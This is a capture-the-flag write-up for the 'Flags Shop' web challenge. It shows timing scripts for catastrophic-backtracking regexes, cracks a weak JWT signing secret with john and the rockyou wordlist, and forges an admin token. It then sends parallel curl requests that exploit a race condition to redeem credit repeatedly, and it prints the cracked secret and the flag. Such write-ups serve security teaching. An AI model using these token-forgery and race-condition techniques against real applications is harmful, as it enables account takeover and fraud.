# FLAGS SHOP

## Description

> They got some fancy flags out there, but that one really takes time to get.

## Write-Up

Test here

<img src="./1.png"
     alt="Markdown Monster icon"
     style="
     width: 80%;
     diplay: box;"
/>

In the login and register, here is the jwt token structure.

```py
 token = jwt.encode({
                'username': username,
                'ticket_regex': generateTicket(username),
                'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=10)
            }, app.config['SECRET_KEY'], algorithm="HS256")
```

Also, we have a weird regex matching :

```py
def generateTicket(username):
    return "%s-[0-9A-F]{4}$"%username

def checkTicket(regex, ticket):
    return re.match(regex, ticket)
```

From here, we can see that to redeem a ticket, we can use any ticket (string) that matches this regex made in the token, like `admin-[0-9A-F]{4}$`. `admin-1234` or `admin-FFFF` are two examples. After redeeming them, we will get 10 points but we wont be able to redeem again.

```py
def userRedeem(username):
    users = getUsers()
    users[username]["redeemed"] = True
    users[username]["balance"] += 10
    updateUsers(users)
```

The idea here is similar to a ReDos attack but we will simulate a **Race condition** to make the first redeeming wait, then, send others on parallel (4 requests) to enhance balance and buy the flag.

To do that, we need to find some interesting regex with examples that takes time to match, here are some examples :

```py
import re
import time

regex = r'([a-z]+)\1{50}'
string = 'abcdefghijklmnopqrstuvwxyz' * 30000

start_time = time.time()
match = re.match(regex, string)
end_time = time.time()

duration = end_time - start_time
print(f"Matching duration: {duration:.4f} seconds")
```

or

```py
import re
import time

regex = "(.*a){28}"
string = "aaaaaaaaaaaaaaaaaaaaaaaaaaaa"

start_time = time.time()
match = re.match(regex, string)
end_time = time.time()

duration = end_time - start_time
print(f"Matching duration: {duration:.4f} seconds")
```

or (the one we will use) :

```py
import re
import time

regex = "(.*a){20}"
string = "aaaaaaaaaaaaaaaaaaaaaaaaaaaa"

start_time = time.time()
match = re.match(regex, string)
end_time = time.time()

duration = end_time - start_time
print(f"Matching duration: {duration:.4f} seconds")
```

Having the solution, Let's try to login and register :

<img src="./1.png"
     alt="Markdown Monster icon"
     style="
     width: 80%;
     diplay: box;"
/>

<img src="./2.png"
     alt="Markdown Monster icon"
     style="
     width: 80%;
     diplay: box;"
/>

Cracking the jwt token  to get the secret :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InIxdjNuY2giLCJ0aWNrZXRfcmVnZXgiOiJyMXYzbmNoLVswLTlBLUZdezR9JCIsImV4cCI6MTY4MzM3OTQ2OH0.J8KoOc7QQC6Ljg_n_3gFW03BjtlyTWao2_JIBzC1deU
```

```
└─$ john jwt.john --wordlist=/usr/share/wordlists/rockyou.txt                                                    1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chickencurry     (?)     
1g 0:00:00:00 DONE (2023-05-06 14:36) 33.33g/s 2457Kp/s 2457Kc/s 2457KC/s truckin..compusa
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

so, the `chickencurry` is the secret key.

after decoding the token :

<img src="./3.png"
     alt="Markdown Monster icon"
     style="
     width: 80%;
     diplay: box;"
/>

```
{
    "username": "r1v3nch",
    "ticket_regex": "r1v3nch-[0-9A-F]{4}$",
    "exp": 1683379468
}
```

From there, we can use the secret key to sign the token back :

<img src="./4.png"
     alt="Markdown Monster icon"
     style="
     width: 80%;
     diplay: box;"
/>

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidGlja2V0X3JlZ2V4IjoiKC4qYSl7MjV9IiwiZXhwIjoxNjgzNTYxNjA4fQ.ndcdggab6C0HoK3dIgBb00uN08w1bcaBXfQ5cXU9X0A
```

Now, the only thing remaining is to replace the token, use the examples string to send 4 parallel requests to enhance the balance. Here is the command of a single one :

```
curl 'https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club//redeem' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Connection: keep-alive' -H 'Referer: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMyIsInRpY2tldF9yZWdleCI6IiguKmEpezIwfSIsImV4cCI6MTY4MzU2NDAxM30.mfTMh4WvJT3oXyjqDLvjUn_gtkg_z748Qq1ob9BXuVY' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'ticket=aaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

We cocatenate the four using `&` operator, we will get :

```
curl 'https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club//redeem' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Connection: keep-alive' -H 'Referer: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMyIsInRpY2tldF9yZWdleCI6IiguKmEpezIwfSIsImV4cCI6MTY4MzU2NDAxM30.mfTMh4WvJT3oXyjqDLvjUn_gtkg_z748Qq1ob9BXuVY' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'ticket=aaaaaaaaaaaaaaaaaaaaaaaaaaaa' & curl 'https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club//redeem' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Connection: keep-alive' -H 'Referer: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMyIsInRpY2tldF9yZWdleCI6IiguKmEpezIwfSIsImV4cCI6MTY4MzU2NDAxM30.mfTMh4WvJT3oXyjqDLvjUn_gtkg_z748Qq1ob9BXuVY' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'ticket=aaaaaaaaaaaaaaaaaaaaaaaaaaaa' & curl 'https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club//redeem' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Connection: keep-alive' -H 'Referer: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMyIsInRpY2tldF9yZWdleCI6IiguKmEpezIwfSIsImV4cCI6MTY4MzU2NDAxM30.mfTMh4WvJT3oXyjqDLvjUn_gtkg_z748Qq1ob9BXuVY' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'ticket=aaaaaaaaaaaaaaaaaaaaaaaaaaaa' & curl 'https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club//redeem' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Connection: keep-alive' -H 'Referer: https://0pgbey7np8cph3b-flags-shop.insts.bsides.shellmates.club/' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMyIsInRpY2tldF9yZWdleCI6IiguKmEpezIwfSIsImV4cCI6MTY4MzU2NDAxM30.mfTMh4WvJT3oXyjqDLvjUn_gtkg_z748Qq1ob9BXuVY' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'ticket=aaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

We get back to our page, refresh, we see the score updated. We buy the real flag.

<img src="./5.png"
     alt="Markdown Monster icon"
     style="
     width: 80%;
     diplay: box;"
/>


## Flag

shellmates{Jwt_X_r3d0s_b3ats_3v3ryth1ng}

## More Information

 - https://security.stackexchange.com/questions/262106/crack-jwt-hs256-with-hashcat
 - https://blog.pentesteracademy.com/hacking-jwt-tokens-bruteforcing-weak-signing-key-johntheripper-89f0c7e6a87
 - https://blog.pentesteracademy.com/hacking-jwt-tokens-bruteforcing-weak-signing-key-jwt-cracker-5d49d34c44
 - https://shauryasharma05.medium.com/cracking-jwt-signature-90fd444fe494
 - https://www.openwall.com/john/doc/EXAMPLES.shtml
 - ReDos : https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
